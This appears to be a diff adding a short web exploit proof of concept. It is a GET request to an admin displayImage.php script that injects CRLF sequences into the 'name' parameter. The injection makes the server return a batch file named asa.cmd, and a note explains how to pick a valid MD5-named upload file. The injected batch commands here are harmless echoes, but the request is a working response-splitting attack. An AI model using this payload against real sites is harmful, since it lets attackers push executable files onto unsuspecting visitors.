@@ -1,0 +1,2 @@
+GET: http://www.example.com/admin/displayImage.php?img=&lt;name_of_existing_file_in_md5_format&gt;&amp;name=asa.cmd&quot;%0d%0a%0d%0a@echo off%0d%0aecho running batch file%0d%0apause%0d%0aexit
+Note: The &lt;name_of_existing_file_in_md5_format&gt; is the name of one file existing on the &quot;upload/&quot; folder. It&#039;s name must be a MD5 hash, without any extension. ex: &quot;435ed7e9f07f740abf511a62c00eef6e&quot; 
